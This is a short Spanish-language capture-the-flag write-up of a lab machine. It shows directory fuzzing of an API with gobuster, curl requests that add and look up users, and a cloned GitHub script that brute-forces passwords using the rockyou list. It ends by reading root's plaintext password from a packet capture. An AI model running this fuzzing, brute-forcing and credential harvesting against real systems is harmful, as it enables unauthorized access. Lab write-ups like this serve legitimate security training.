## Reconocimiento

Puerto 22 : SSH

Puerto 5000 : HTTP

La web tiene alojada una Api.

Realizo fuzzing:

```bash
gobuster dir -u http://172.17.0.2:5000/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Encuentro 2 rutas: add y console

Interesa el add, ya que se trata de usuarios y teniendo el servicio SSH podría encontrar credenciales.

Añado un usuario nuevo:

```bash
curl -X POST "http://172.17.0.2:5000/add" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=John&email=john@example.com&password=123456"
```

Compruebo:

```bash
curl -X GET "http://172.17.0.2:5000/users?username=John"
```

Veo que nos da el ID numero 3, sabiendo eso intuyo que los demás los tienen los posibles usuarios del servidor. Buscando encuentro un script en GitHub muy útil:

```bash
git clone https://github.com/Shinkirou789/Peticiones_get_automaticas.git 
cd Peticiones_get_automaticas
chmod 0700 Api_fuerza_bruta.sh
```

Lo ejecuto:

```bash
./Api_fuerza_bruta.sh /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
```

Encuentro el usuario pingu y la contraseña `pinguinasio.`

## Escalada

En la carpeta de /home hay un archivo interesante:

```bash
cat network.pcap
```

Info:

```
�ò����&�gVF((E(@"���P .�&�g@G((E(@O��P [�&�g�G((E(@"���P .�&�g3H33E3@"���P aRLOGIN root
&�g
   I66E6@"���P ��PASS balulero
&�g�I66E6@O��P ��Access Denied
```

Revela las credenciales de root.

Listo.
